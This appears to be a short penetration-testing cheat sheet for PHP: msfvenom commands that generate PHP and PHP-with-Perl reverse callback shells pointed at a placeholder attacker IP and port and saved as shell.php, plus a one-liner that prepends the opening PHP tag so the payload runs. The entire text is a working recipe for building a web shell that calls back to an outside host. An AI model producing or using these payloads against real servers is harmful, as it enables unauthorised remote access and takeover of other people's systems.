# PHP

- PHP reverse callback shell

`$ msfvenom -p php/reverse_php lhost=<IP> lport=<PORT> -f raw -o shell.php`

- PHP with perl code reverse callback shell

`$ msfvenom -p php/reverse_perl lhost=<IP> lport=<PORT> -f raw -o shell.php`

- After generating the PHP reverse callback shell include the tags to ensure execution.

```
$ cat shell.php | xclip -selection clipboard && echo '<?php ' | tr -d '\n'> shell.php && xclip -selection clipboard -o >> shell.php
```